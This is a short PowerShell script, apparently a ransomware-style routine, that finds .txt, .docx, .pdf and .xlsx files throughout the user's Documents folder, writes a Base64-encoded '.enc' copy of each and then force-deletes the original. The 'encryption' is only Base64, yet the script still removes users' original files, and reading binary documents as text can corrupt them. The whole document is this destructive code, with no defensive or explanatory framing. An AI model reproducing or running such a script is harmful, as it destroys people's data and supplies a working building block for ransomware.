# Set the target folder
$targetFolder = "$env:USERPROFILE\Documents"

# Encrypt files
Get-ChildItem -Path $targetFolder -Recurse -Include *.txt,*.docx,*.pdf,*.xlsx -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $content = Get-Content $_.FullName -Raw
        $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
        $newFile = "$($_.FullName).enc"
        [IO.File]::WriteAllText($newFile, $encoded)

        # Attempt to remove the original file
        Remove-Item $_.FullName -Force
    } catch {
        Write-Host "Error processing file: $($_.FullName) - $_"
    }
}
